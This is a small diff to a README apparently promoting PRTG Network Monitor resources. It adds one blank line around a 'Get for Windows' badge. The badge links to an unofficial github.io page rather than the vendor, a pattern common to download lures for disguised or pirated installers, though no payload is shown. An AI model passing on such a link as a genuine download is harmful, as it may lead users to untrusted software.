@@ -7,6 +7,7 @@
 **Optimize your IT infrastructure visibility with expert resources for PRTG Network Monitor deployment and configuration.**
 
 <div align="center">
+
 [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://caricoreil340.github.io/.github/)
 </div>
 
